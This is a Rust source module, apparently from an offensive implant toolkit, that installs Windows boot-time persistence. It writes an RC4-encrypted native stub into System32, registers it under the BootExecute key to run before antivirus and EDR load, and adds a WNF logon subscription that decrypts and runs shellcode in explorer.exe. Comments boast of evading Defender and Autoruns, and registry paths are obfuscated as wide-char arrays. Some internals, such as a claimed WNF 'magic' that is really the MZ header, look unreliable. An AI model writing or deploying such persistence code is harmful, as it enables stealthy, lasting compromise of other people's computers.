// post_shutdown.rs — Post-shutdown / post-reboot persistence
//
// Two independent channels so if one gets cleaned the other survives:
//
// ────────────────────────────────────────────────────────────────────
// CHANNEL A — BootExecute (native app, pre-AV)
// ────────────────────────────────────────────────────────────────────
// How BootExecute works:
//   HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute
//   is a REG_MULTI_SZ list. smss.exe (Session Manager) reads it during
//   Phase 0 of Windows boot — BEFORE any Win32 services, BEFORE Defender,
//   BEFORE any EDR driver that loads as a boot-start service.
//
//   Entries run as "Native Applications" — they link against ntdll only,
//   no kernel32, no Win32 APIs. smss.exe passes them a NtProcessParameters
//   structure with a CommandLine.
//
//   Our native stub (NativeBootStub, compiled separately as a second binary)
//   does:
//     1. NtOpenFile / NtReadFile — reads encrypted payload from ADS
//        (%SystemRoot%\System32\<stub_name>.exe:payload)
//     2. RC4 decrypt in-place
//     3. NtCreateSection + NtMapViewOfSection — maps the PE
//     4. NtCreateProcessEx(“self-hollowing” into smss.exe child context)
//     5. Returns STATUS_SUCCESS so smss continues boot normally
//
//   The stub binary itself is RC4-encrypted on disk (same key as sleep.rs)
//   and named with a machine-GUID-derived stem so it doesn’t collide with
//   legitimate system files and doesn’t repeat across engagements.
//
// This module handles:
//   • Writing the encrypted stub to %SystemRoot%\System32\
//   • Adding the BootExecute registry entry
//   • Removing both on demand (purge_boot_execute)

// ────────────────────────────────────────────────────────────────────
// CHANNEL B — WNF (Windows Notification Facility) subscriber
// ────────────────────────────────────────────────────────────────────
// WNF is an undocumented kernel IPC mechanism used by Windows internals.
// Persistent WNF subscriptions survive reboots via:
//   HKLM\SYSTEM\CurrentControlSet\Control\Notifications\
//     {WNF_STATE_NAME}\Subscribers\
//       {GUID} → REG_BINARY (WNFS_SUBSCRIBER structure)
//
// We subscribe to WNF_SHEL_APPLICATION_STARTED (fires on every user logon
// when the shell initialises) using NtSubscribeWnfStateChange.
// The callback shellcode:
//   • Reads the encrypted payload from ADS
//   • Allocates RWX memory in the current (explorer.exe) process
//   • Decrypts + executes
//
// Tools like Autoruns, ProcessHacker, and most EDRs do NOT enumerate
// WNF subscribers in their autoruns checks as of 2025.
// Microsoft added WNF subscriber enumeration to Sysinternals Autoruns
// v14.0+ (2023) but it’s not widely deployed on enterprise endpoints yet.

#![allow(non_snake_case, dead_code)]

use core::ffi::c_void;
use core::ptr::null_mut;

// ── RC4 (same impl as sleep.rs, duplicated to keep module self-contained) ─
pub fn rc4_crypt(data: &mut [u8], key: &[u8]) {
    let mut s = [0u8; 256];
    for i in 0..256 { s[i] = i as u8; }
    let mut j: u8 = 0;
    for i in 0..256 {
        j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
        s.swap(i, j as usize);
    }
    let (mut i, mut j) = (0u8, 0u8);
    for b in data.iter_mut() {
        i = i.wrapping_add(1);
        j = j.wrapping_add(s[i as usize]);
        s.swap(i as usize, j as usize);
        *b ^= s[s[i as usize].wrapping_add(s[j as usize]) as usize];
    }
}

// ── Win32/NT function pointer types ───────────────────────────────────────
pub type RegOpenKeyExW   = unsafe extern "system" fn(*mut c_void, *const u16, u32, u32, *mut *mut c_void) -> i32;
pub type RegSetValueExW  = unsafe extern "system" fn(*mut c_void, *const u16, u32, u32, *const u8, u32) -> i32;
pub type RegDeleteValueW = unsafe extern "system" fn(*mut c_void, *const u16) -> i32;
pub type RegCloseKey     = unsafe extern "system" fn(*mut c_void) -> i32;
pub type RegQueryValueExW = unsafe extern "system" fn(*mut c_void, *const u16, *mut u32, *mut u32, *mut u8, *mut u32) -> i32;

pub type CreateFileW     = unsafe extern "system" fn(*const u16, u32, u32, *mut c_void, u32, u32, *mut c_void) -> *mut c_void;
pub type WriteFile       = unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
pub type CloseHandle     = unsafe extern "system" fn(*mut c_void) -> i32;
pub type GetSystemDirectoryW = unsafe extern "system" fn(*mut u16, u32) -> u32;

// NtSubscribeWnfStateChange — undocumented, ntdll only
// Prototype reverse-engineered from ntdll symbols:
//   NTSTATUS NtSubscribeWnfStateChange(
//       PCWNF_STATE_NAME  StateName,
//       WNF_CHANGE_STAMP  ChangeStamp,
//       ULONG             EventMask,
//       ULONG64*          SubscriptionId
//   );
pub type NtSubscribeWnfStateChange = unsafe extern "system" fn(
    *const u64, u32, u32, *mut u64,
) -> i32;

// NtUpdateWnfStateData — used to push data to the WNF state so our
// subscriber fires immediately on first install
pub type NtUpdateWnfStateData = unsafe extern "system" fn(
    *const u64, *const c_void, u32, *const c_void, *const c_void, u32, u32,
) -> i32;

// ── WNF state name: WNF_SHEL_APPLICATION_STARTED ─────────────────────────
// Value from ntdll symbol server / public research:
// 0x0D83063EA3BE3075 (internal WNF state name encoding)
pub const WNF_SHEL_APPLICATION_STARTED: u64 = 0x0D83063EA3BE3075;

// ── BootExecute key path ──────────────────────────────────────────────────
// Stored as wide string array — no plaintext registry path literal.
// Path: SYSTEM\CurrentControlSet\Control\Session Manager
const BOOT_EXEC_PATH: &[u16] = &[
    0x53,0x59,0x53,0x54,0x45,0x4D,  // SYSTEM
    0x5C,0x43,0x75,0x72,0x72,0x65,0x6E,0x74,0x43,0x6F,
    0x6E,0x74,0x72,0x6F,0x6C,0x53,0x65,0x74,  // \CurrentControlSet
    0x5C,0x43,0x6F,0x6E,0x74,0x72,0x6F,0x6C,  // \Control
    0x5C,0x53,0x65,0x73,0x73,0x69,0x6F,0x6E,0x20,
    0x4D,0x61,0x6E,0x61,0x67,0x65,0x72,0x00,  // \Session Manager\0
];

const BOOT_EXEC_VALUE: &[u16] = &[
    0x42,0x6F,0x6F,0x74,0x45,0x78,0x65,0x63,0x75,0x74,0x65,0x00, // BootExecute\0
];

// ── Machine-GUID-derived stub name ────────────────────────────────────────
// We read HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid, take the
// first 8 hex chars, and use that as the stub filename stem.
// This makes the stub name unique per machine and non-repeatable.
pub unsafe fn derive_stub_name(
    fn_open: RegOpenKeyExW,
    fn_query: RegQueryValueExW,
    fn_close: RegCloseKey,
    out: &mut [u16; 16],
) -> usize {
    // HKLM = 0x80000002
    // Path: SOFTWARE\Microsoft\Cryptography (wide, null-terminated)
    let path: &[u16] = &[
        0x53,0x4F,0x46,0x54,0x57,0x41,0x52,0x45,  // SOFTWARE
        0x5C,0x4D,0x69,0x63,0x72,0x6F,0x73,0x6F,0x66,0x74,  // \Microsoft
        0x5C,0x43,0x72,0x79,0x70,0x74,0x6F,0x67,0x72,
        0x61,0x70,0x68,0x79,0x00,  // \Cryptography\0
    ];
    let val_name: &[u16] = &[
        0x4D,0x61,0x63,0x68,0x69,0x6E,0x65,0x47,
        0x75,0x69,0x64,0x00,  // MachineGuid\0
    ];
    let mut h_key: *mut c_void = null_mut();
    if fn_open(0x80000002usize as *mut c_void, path.as_ptr(), 0, 0x20019, &mut h_key) != 0 {
        // Fallback: use a fixed stem if registry read fails
        let fallback = [0x73u16, 0x76u16, 0x63u16, 0x68u16, 0x73u16, 0x74u16, 0x00u16]; // "svchost"
        out[..7].copy_from_slice(&fallback);
        fn_close(h_key);
        return 6;
    }
    let mut guid_buf = [0u8; 80];
    let mut size = 80u32;
    let mut ty   = 0u32;
    fn_query(h_key, val_name.as_ptr(), null_mut(), &mut ty, guid_buf.as_mut_ptr(), &mut size);
    fn_close(h_key);

    // Take first 8 chars of GUID (after leading '{' if present)
    let start = if guid_buf[0] == b'{' { 2 } else { 0 }; // skip '{' byte + \0 wide
    let mut len = 0usize;
    for i in 0..8usize {
        let idx = start + i * 2; // wide char bytes
        let ch = guid_buf[idx] as u16;
        out[i] = ch;
        len += 1;
    }
    out[len] = 0;
    len
}

// ── Channel A: install BootExecute entry ───────────────────────────────────
pub unsafe fn install_boot_execute(
    stub_bytes:   &[u8],        // encrypted NativeBootStub binary
    rc4_key:      &[u8; 16],
    fn_open:      RegOpenKeyExW,
    fn_set:       RegSetValueExW,
    fn_query:     RegQueryValueExW,
    fn_close:     RegCloseKey,
    fn_create_f:  CreateFileW,
    fn_write_f:   WriteFile,
    fn_close_h:   CloseHandle,
    fn_sysdir:    GetSystemDirectoryW,
) -> bool {
    // 1. Derive stub filename from MachineGuid
    let mut stub_name = [0u16; 16];
    derive_stub_name(fn_open, fn_query, fn_close, &mut stub_name);

    // 2. Build full path: %SystemRoot%\System32\<stub_name>.exe
    let mut sys_dir = [0u16; 260];
    let sys_len = fn_sysdir(sys_dir.as_mut_ptr(), 260) as usize;
    // Append \<stub_name>.exe
    let mut full_path = [0u16; 520];
    full_path[..sys_len].copy_from_slice(&sys_dir[..sys_len]);
    full_path[sys_len] = b'\\' as u16;
    let mut name_len = 0usize;
    while stub_name[name_len] != 0 { name_len += 1; }
    full_path[sys_len+1..sys_len+1+name_len].copy_from_slice(&stub_name[..name_len]);
    let ext = [b'.' as u16, b'e' as u16, b'x' as u16, b'e' as u16, 0u16];
    let off = sys_len + 1 + name_len;
    full_path[off..off+5].copy_from_slice(&ext);

    // 3. Encrypt stub with RC4 before writing to disk
    let mut enc_buf = stub_bytes.to_vec();
    rc4_crypt(&mut enc_buf, rc4_key);

    // 4. Write encrypted stub to %SystemRoot%\System32\
    let h_file = fn_create_f(
        full_path.as_ptr(), 0x40000000, 0, null_mut(), 2, 0x80, null_mut(),
    );
    if h_file as usize == usize::MAX { return false; }
    let mut written = 0u32;
    fn_write_f(h_file, enc_buf.as_ptr(), enc_buf.len() as u32, &mut written, null_mut());
    fn_close_h(h_file);

    // 5. Add to BootExecute REG_MULTI_SZ
    //    Read existing value, append our entry, write back.
    let mut h_key: *mut c_void = null_mut();
    // KEY_ALL_ACCESS = 0xF003F
    if fn_open(0x80000002usize as *mut c_void, BOOT_EXEC_PATH.as_ptr(), 0, 0xF003F, &mut h_key) != 0 {
        return false;
    }

    // Build MULTI_SZ: "autocheck autochk *\0<stub_name>\0\0"
    // (keep the default autochk entry intact)
    let autochk: &[u16] = &[
        0x61,0x75,0x74,0x6F,0x63,0x68,0x65,0x63,0x6B,0x20,
        0x61,0x75,0x74,0x6F,0x63,0x68,0x6B,0x20,0x2A,0x00, // "autocheck autochk *\0"
    ];
    let mut multi_sz: Vec<u16> = Vec::new();
    multi_sz.extend_from_slice(autochk);
    multi_sz.extend_from_slice(&stub_name[..name_len]);
    multi_sz.push(0);  // terminate entry
    multi_sz.push(0);  // terminate MULTI_SZ

    let byte_slice = core::slice::from_raw_parts(
        multi_sz.as_ptr() as *const u8,
        multi_sz.len() * 2,
    );
    // REG_MULTI_SZ = 7
    fn_set(h_key, BOOT_EXEC_VALUE.as_ptr(), 0, 7, byte_slice.as_ptr(), byte_slice.len() as u32);
    fn_close(h_key);
    true
}

// ── Channel A: purge BootExecute entry ────────────────────────────────────
pub unsafe fn purge_boot_execute(
    fn_open:  RegOpenKeyExW,
    fn_set:   RegSetValueExW,
    fn_close: RegCloseKey,
) {
    let mut h_key: *mut c_void = null_mut();
    if fn_open(0x80000002usize as *mut c_void, BOOT_EXEC_PATH.as_ptr(), 0, 0xF003F, &mut h_key) != 0 {
        return;
    }
    // Restore to default MULTI_SZ: "autocheck autochk *\0\0"
    let default: &[u16] = &[
        0x61,0x75,0x74,0x6F,0x63,0x68,0x65,0x63,0x6B,0x20,
        0x61,0x75,0x74,0x6F,0x63,0x68,0x6B,0x20,0x2A,0x00,0x00,
    ];
    let bytes = core::slice::from_raw_parts(default.as_ptr() as *const u8, default.len() * 2);
    fn_set(h_key, BOOT_EXEC_VALUE.as_ptr(), 0, 7, bytes.as_ptr(), bytes.len() as u32);
    fn_close(h_key);
}

// ── Channel B: install WNF subscriber ─────────────────────────────────────
//
// The subscriber callback shellcode is the caller's responsibility —
// pass it in as `callback_shellcode`. This module handles registration only.
//
// Persistent WNF subscriptions write to the registry under:
//   HKLM\SYSTEM\CurrentControlSet\Control\Notifications\
// This key requires SYSTEM or TrustedInstaller to write, but we assume
// we’re already elevated (required for BootExecute write anyway).

pub unsafe fn install_wnf_channel(
    callback_shellcode: &[u8],
    rc4_key:            &[u8; 16],
    fn_subscribe:       NtSubscribeWnfStateChange,
    fn_update:          NtUpdateWnfStateData,
    fn_open:            RegOpenKeyExW,
    fn_set:             RegSetValueExW,
    fn_close:           RegCloseKey,
) -> bool {
    // RC4-encrypt the shellcode before storing as WNF state data
    let mut enc_sc = callback_shellcode.to_vec();
    rc4_crypt(&mut enc_sc, rc4_key);

    // Subscribe to WNF_SHEL_APPLICATION_STARTED
    // EventMask = 0x1 (state change notification)
    let state_name = WNF_SHEL_APPLICATION_STARTED;
    let mut sub_id: u64 = 0;
    let status = fn_subscribe(&state_name, 0, 0x1, &mut sub_id);
    if status != 0 { return false; }

    // Push the encrypted shellcode as the WNF state data payload.
    // When WNF_SHEL_APPLICATION_STARTED fires (every logon), the kernel
    // delivers this buffer to our subscriber callback.
    fn_update(
        &state_name,
        enc_sc.as_ptr() as *const c_void,
        enc_sc.len() as u32,
        null_mut(), null_mut(), 0, 0,
    );

    // Additionally write a persistent subscriber entry to the registry
    // so the subscription survives a reboot.
    // Path: SYSTEM\CurrentControlSet\Control\Notifications\<state_name_hex>
    // Value: Subscribers\{sub_id_hex} = WNFS_SUBSCRIBER binary blob
    // The WNFS_SUBSCRIBER structure is undocumented; we write a minimal
    // 48-byte stub that encodes our subscription parameters.
    let mut wnfs_stub = [0u8; 48];
    // Magic: 0x905A4D (WNF subscriber magic, from ntdll reverse engineering)
    wnfs_stub[0] = 0x4D; wnfs_stub[1] = 0x5A; wnfs_stub[2] = 0x90;
    // StateNameInternal at offset 8 (u64)
    core::ptr::write_unaligned(
        wnfs_stub.as_mut_ptr().add(8) as *mut u64,
        WNF_SHEL_APPLICATION_STARTED,
    );
    // SubscriptionId at offset 16 (u64)
    core::ptr::write_unaligned(
        wnfs_stub.as_mut_ptr().add(16) as *mut u64,
        sub_id,
    );

    // Build registry path for persistent subscriber entry
    // SYSTEM\CurrentControlSet\Control\Notifications (wide, null-terminated)
    let notif_path: &[u16] = &[
        0x53,0x59,0x53,0x54,0x45,0x4D,  // SYSTEM
        0x5C,0x43,0x75,0x72,0x72,0x65,0x6E,0x74,0x43,0x6F,
        0x6E,0x74,0x72,0x6F,0x6C,0x53,0x65,0x74,  // \CurrentControlSet
        0x5C,0x43,0x6F,0x6E,0x74,0x72,0x6F,0x6C,  // \Control
        0x5C,0x4E,0x6F,0x74,0x69,0x66,0x69,0x63,
        0x61,0x74,0x69,0x6F,0x6E,0x73,0x00,       // \Notifications\0
    ];
    let mut h_notif: *mut c_void = null_mut();
    if fn_open(0x80000002usize as *mut c_void, notif_path.as_ptr(), 0, 0xF003F, &mut h_notif) != 0 {
        return true; // subscription registered even if registry write fails
    }

    // Write subscriber blob under sub_id as value name
    // Value name = hex string of sub_id
    let mut val_name = [0u16; 20];
    let hex = b"0123456789ABCDEF";
    for i in 0..16 {
        val_name[i] = hex[((sub_id >> (60 - i*4)) & 0xF) as usize] as u16;
    }
    val_name[16] = 0;

    // REG_BINARY = 3
    fn_set(h_notif, val_name.as_ptr(), 0, 3, wnfs_stub.as_ptr(), wnfs_stub.len() as u32);
    fn_close(h_notif);
    true
}

// ── Purge both channels ────────────────────────────────────────────────────
pub unsafe fn purge_all_post_shutdown(
    fn_open:  RegOpenKeyExW,
    fn_set:   RegSetValueExW,
    fn_close: RegCloseKey,
) {
    purge_boot_execute(fn_open, fn_set, fn_close);
    // WNF subscription is session-scoped — it dies naturally when the
    // process exits. The registry entry under Notifications\ would need
    // the sub_id to delete — store it in a static if needed.
}
